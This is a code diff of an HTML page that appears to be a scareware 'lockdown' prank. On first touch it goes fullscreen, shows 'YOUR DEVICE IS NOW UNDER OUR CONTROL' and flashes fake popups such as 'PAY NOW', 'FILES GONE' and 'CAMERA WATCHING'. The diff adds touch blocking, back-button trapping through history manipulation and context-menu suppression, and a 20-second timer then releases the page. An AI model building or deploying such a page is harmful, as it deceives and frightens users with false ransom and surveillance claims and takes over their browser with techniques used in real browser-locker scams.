@@ -16,11 +16,10 @@
     .matrix { position:absolute; top:0; left:0; right:0; bottom:0; opacity:0.15; background:repeating-linear-gradient(0deg,#0f0,#0f0 1px,transparent 1px,transparent 2px); animation:rain 8s linear infinite; pointer-events:none; z-index:1; }
     @keyframes rain { 0%{transform:translateY(-100%);} 100%{transform:translateY(100%);} }
 
-    /* Blockers for bottom swipe (navigation bar) - 15 layers */
-    .bottom-blocker { position:fixed; bottom:0; left:0; right:0; height:300px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
-
-    /* Blockers for top swipe (status bar / quick settings) - 15 layers */
-    .top-blocker { position:fixed; top:0; left:0; right:0; height:300px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
+    .fake-popup { position:fixed; left:0; right:0; background:rgba(200,0,0,0.95); color:#fff; font-size:2.5rem; text-align:center; padding:30px; z-index:9999; pointer-events:auto; display:none; animation:flash 1s; }
+    @keyframes flash { 0%{opacity:0; transform:scale(0.8);} 50%{opacity:1; transform:scale(1.1);} 100%{opacity:0; transform:scale(1);} }
+    .bottom-popup { bottom:0; height:250px; }
+    .top-popup { top:0; height:250px; }
   </style>
 </head>
 <body>
@@ -35,47 +34,21 @@
     <p style="color:#f00; font-size:2.2rem; margin-top:50px;">YOUR DEVICE IS NOW UNDER OUR CONTROL</p>
   </div>
 
-  <!-- 15 bottom blockers -->
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
-
-  <!-- 15 top blockers -->
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
-  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <script>
+    const scaryMessages = ["ACCESS DENIED", "NO ESCAPE", "HACKER ACTIVE", "SYSTEM LOCKED", "CAMERA WATCHING", "PAY NOW", "FILES GONE", "INTRUDER ALERT", "BACKDOOR OPEN", "TRAPPED FOREVER"];
+    for(let i = 0; i < 10; i++) {
+      let msg = scaryMessages[i % scaryMessages.length];
+      document.write(`<div class="fake-popup bottom-popup" onclick="this.style.display='none'">${msg}</div>`);
+      document.write(`<div class="fake-popup top-popup" onclick="this.style.display='none'">${msg}</div>`);
+    }
+  </script>
 
   <script>
     let time = 20;
     const start = document.getElementById('start');
     const overlay = document.getElementById('overlay');
     const countdown = document.getElementById('countdown');
-    const bottomBlockers = document.querySelectorAll('.bottom-blocker');
-    const topBlockers = document.querySelectorAll('.top-blocker');
+    const popups = document.querySelectorAll('.fake-popup');
 
     document.body.addEventListener('touchstart', startLockdown, {once: true});
     document.body.addEventListener('click', startLockdown, {once: true});
@@ -85,17 +58,19 @@
       start.style.display = 'none';
       overlay.style.display = 'flex';
 
-      // Show all 30 blockers
-      bottomBlockers.forEach(b => b.style.display = 'block');
-      topBlockers.forEach(b => b.style.display = 'block');
+      popups.forEach(p => p.style.display = 'block');
 
-      // Immersive fullscreen
       if (document.documentElement.requestFullscreen) {
         await document.documentElement.requestFullscreen({ navigationUI: "hide" });
       }
 
-      // Block normal swipes
+      // Strongest swipe/touch block
+      document.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
       document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+
+      // Back button block
+      history.pushState(null, null, location.href);
+      window.onpopstate = () => history.pushState(null, null, location.href);
 
       const timer = setInterval(() => {
         time--;
@@ -109,13 +84,11 @@
     }
 
     function endLockdown() {
-      // Hide remaining blockers
-      bottomBlockers.forEach(b => b.style.display = 'none');
-      topBlockers.forEach(b => b.style.display = 'none');
+      popups.forEach(p => p.style.display = 'none');
       if (document.exitFullscreen) document.exitFullscreen();
     }
 
     document.addEventListener('contextmenu', e => e.preventDefault());
   </script>
 </body>
-                                                                 </html>
+</html>
